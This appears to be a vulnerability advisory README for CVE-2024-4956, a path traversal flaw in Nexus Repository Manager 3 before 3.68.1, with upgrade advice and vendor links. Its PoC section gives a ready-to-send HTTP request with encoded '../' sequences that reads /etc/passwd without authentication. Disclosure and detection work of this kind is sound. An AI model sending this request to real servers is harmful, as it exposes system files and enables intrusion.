# CVE-2024-4956 - Unauthenticated Path Traversal in Nexus Repository Manager 3 

The Nexus Repository Manager is a repository manager that organizes, stores, and distributes artifacts needed for development.

A path traversal vulnerability has been discovered in Nexus Repository 3, in versions prior to 3.68.1. This vulnerability allows an attacker to craft a URL to download system files outside the scope of the Nexus Repository application, without any authentication. This poses a significant risk as it can expose sensitive system files and potentially compromise the security of the environment where Nexus Repository is installed.

It is recommended to update Nexus Repository to version 3.68.1 or later as soon as possible to mitigate this vulnerability. 

For more information and technical details about the vulnerability, please refer to the following link:

References:

- <https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16>

## Vulnerable versions

The vulnerability affects versions 3.0 to 3.68.0 of Sonatype Nexus Repository Manager.

### Mitigation:

Upgrading Nexus Repository is the recommended approach for eliminating this vulnerability. However, immediate mitigation options are available for deployments that cannot upgrade immediately: 

References:

- <https://support.sonatype.com/hc/en-us/articles/29412417068819>

## PoC

```
GET /%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

With the above PoC, it is possible to see the /etc/passwd file being accessed:

![](PoC.png)

## Nuclei Template 

(CVE-2024-4956.yaml) <https://github.com/erickfernandox/CVE-2024-4956/blob/main/CVE-2024-4956.yaml>

